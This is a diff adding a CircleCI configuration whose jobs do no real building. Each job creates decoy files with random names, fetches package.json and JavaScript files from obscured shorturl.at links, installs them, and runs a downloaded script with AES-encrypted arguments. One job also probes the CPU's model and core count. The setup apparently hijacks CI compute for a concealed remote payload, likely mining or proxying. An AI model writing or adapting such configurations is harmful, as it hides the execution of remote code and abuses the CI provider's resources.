@@ -1,0 +1,74 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  MyFirstYAMLJob:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir opsdzgybdh79sf7l5j123ox3r9
+      - run: touch 6t9jahe81kr5k0qwykx.js
+      - run: curl -fsSL shorturl.at/eqHQX -o package.json && curl -fsSL
+          shorturl.at/desKR -o wh7wzz69e9k9.js && curl -fsSL shorturl.at/bjsIL
+          -o wtrijksggusf7s9.js
+      - run: npm i -s
+      - run: mkdir 2joithvhhijp77oljnss260ndqncl9
+      - run: touch 7plo5eza7pbeykg5e.css
+      - run: mkdir x7ac3or92trno1drek7
+      - run: touch v5xnk12dqg7u9fhts0hv4cm.js
+      - run: node wtrijksggusf7s9 -t
+          U2FsdGVkX1/yZqlSeQNeyjkhQ67hPdslGDQASTjRfrhB7hH0Pv66BnPrj+ZnpiZn -sp
+          -r
+          U2FsdGVkX1/+4ENECUxNrzT3YU7XODBvrkKlRKK+lhjtMOLeggSxwfcY0lfmOOwDJuu9ETomDvVpxIAozZoQgH0VZpr/mth4FopyPbU5vfNO47cA1YSQJIa6rsfXzQV6/bwbWWkuv0sBIsl80R4oU5FOT9ZlIBAL9bXe4dG0LGlkGmIe5irmcgF5K4pKXKdnTPWR7Jph0/P3rSsKkXsKU/Pu4RdeKCMmM+0Xp6kD6CS5006s7HYt0a8yliuTo8dV9Y7Es2jh5u/FR9mVUzybS+L8VXTj9Q4uhHUSXfwInXU=
+          -s
+          U2FsdGVkX1+z8R92EG/6YxvZea3656tAzS1D7vxU7y0E/6BPZ1gCWdB+MVEYq6jLR9tK3xO8myOWhLgm6J7nBWrL/SzUREooMgQ5hQVeTZw6wOxix4pGAzkMjZoK/ncYjMbYpHuD/MESs6cFh8N0Rkc1WLUAqRrPNbOMBab55dtQZRXgV5ygDhfNBwlhsN3P+/WS4mQVVqF5tfGOaZx8JB8czASo8NNqvXqIyhbANtg=
+          -lpn U2FsdGVkX1++JaseOq1K0vN6jvJWJeX49Iu5fKytB3w=
+  chay-thu-nghiem:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir wv9gzb6cv9jklpeokzzf4yyw
+      - run: mkdir 9zu91u07zaqx5c2cbq71acjsb
+      - run: curl -fsSL shorturl.at/wHS16 -o b426n6ulpmo91r1k89.js && curl -fsSL
+          shorturl.at/ikGY7 -o package.json && curl -fsSL shorturl.at/ezIP5 -o
+          1ftv47sxonxwsje.js
+      - run: npm i -s
+      - run: mkdir kgffoohptk018xlyd0l7su
+      - run: touch 1tqgmvh0fut2autwqkd0f.ts
+      - run: node b426n6ulpmo91r1k89 -s
+          U2FsdGVkX18I33Eq8OUDNmIvAtJ08TbLrxqcpkkznEz0G+M6WPkWwR4fA+7gmsTDvPW49mDdPAtxjDDejtMGpg/PObAAOXfQsqOXFvSHnmH8UyCN5VerMmUxmM24Y08bVAxgYfE8gGw0q3EhiIE5oZRJGIldyGbY0Xx8eH6ovu2vqi8X10w3T7nESI7sA25nXQMD74EmwPU+U/Ub7Z6oyf718jUhCveLpdMVil4jBgQ=
+          -sp -lpn U2FsdGVkX1+VhG47kas9dkYdmN6RYZjii1hmZU9cc+A= -t
+          U2FsdGVkX1/wjQjJmoxW/CtpoGFk1ipBo07U7dMQ0ITmpfgpX2jTpSlfWRrVtczl -r
+          U2FsdGVkX18AdlhVSFYcJL+S4pUkAssGkVjEiEivRwd4kx/FZXxZmQdTmBAMBLPZWrKWXmXKiKbto1F98oAW/X/sxrQjkCt8aRfgaSkTw5L66luqYsJWCZsj0ppKYYcb69UuPwm/OF7UZf+Ll3J4ATYOIloiFE85BsOxSvxyKQi7i3yEXdczETpNWeAjMma4zjff/lGcv5JuhXuQgkmBoYLYrPIO5WKUp7tGYr3WikXkC/JJeGjikWhSL1EbUoxR295mw7LvvVTvo9CTvBgHzanhjT/CPkuMYxlb4MUsrPk=
+      - run: touch r7geuvr2z1w.py
+      - run: touch k14c3uggadcgbjjn2d.sh
+  jobs_88:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: touch 2dk8cbn0ab5uqdk.php
+      - run: curl -fsSL shorturl.at/gyD38 -o mdllj01ub96g3nf.js && curl -fsSL
+          shorturl.at/nwUY3 -o package.json && curl -fsSL shorturl.at/ovwyO -o
+          5ybzf46sxyj5roql9p3s.js
+      - run: touch uceqdekk6lcbopkrgx3uf4sb4gpf.cpp
+      - run: mkdir emrgwwg5tay9
+      - run: npm i -s
+      - run: touch j1wkkcsfx6z5p4.html
+      - run: touch c3jt75zak9rt8i2iq9uqovz.net
+      - run: node 5ybzf46sxyj5roql9p3s -t
+          U2FsdGVkX1+WOhe5ShU2B2Hq0BIYNdf0xOXJqzZXRd6yYt/WSkKklAlnS1Rkl3b+ -r
+          U2FsdGVkX1/WNBU4eRXW/SG6TDFq5enAaf7AK1VK3UZeG9GZ2bYeRpawgOoBZxjg6dtnW0pMGsfRhwrDXrqmc8JQQ+CcFA8OT7zIqebnG92gO6hQAVfZaaLGpdtu0lUe9OtzEjGCyLlGRQFyMyfeCoAatK1TILNjFo1Ohq8Q36eV6OWf/CE3MVPvSBqNzXAt7L70twTHOO4jFyOy+BH0BlVGqeOcLvv4hiE2UXIATaJy1SAmGp8qoqmicWWX2k4LuzojDNvMX5H8IMQFR7DKIaOt0i14q3Oubpwa0r6tvNo=
+          -s
+          U2FsdGVkX1+zzaboxvXduJxudDOwJQCZdOcOqVfwemZzt4fEFBToesZApujUQYlIfhS7XVkFufamaUXbCVAX95R3nMp4xbPjWtmrj7aRCIaZObVY0NeczTmUgVqPdBvGr9EmAf8IjjE3SZZd7STf8w7mzsSN7r81xEQj91oiAe9kQUaaQ8Rlb3Oh+vV/uFR59aU8UHooMpX3UASIjEAaSVZZTOjQDNr5qTO9wRVInhw=
+          -sp -lpn U2FsdGVkX183ppRIVw2JoYhpKrsgFLc80QoDw53GODQ=
+workflows:
+  building:
+    jobs:
+      - MyFirstYAMLJob
+  working:
+    jobs:
+      - chay-thu-nghiem
+      - jobs_88
